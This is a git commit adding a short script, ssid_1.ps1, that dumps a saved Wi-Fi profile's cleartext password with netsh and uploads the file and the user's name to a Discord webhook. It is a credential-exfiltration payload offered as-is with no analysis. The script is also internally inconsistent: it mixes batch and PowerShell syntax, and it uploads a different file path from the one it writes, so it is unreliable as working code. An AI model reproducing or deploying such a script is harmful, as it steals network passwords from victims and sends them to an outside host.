f8fa83a25ad4897c463ed9a8f178199029b198a7
vtrluc <lucnanko@outlook.com>
2024-08-29 17:27:38 +0200

    Add files via upload

---
+++ ssid_1.ps1
@@ -0,0 +1,32 @@
+@echo off
+set ssid=Ar
+set outputFile=%TEMP%\wifi-profile-%ssid%.txt
+
+netsh wlan show profile name="%ssid%" key=clear > "%outputFile%"
+
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+
+pause
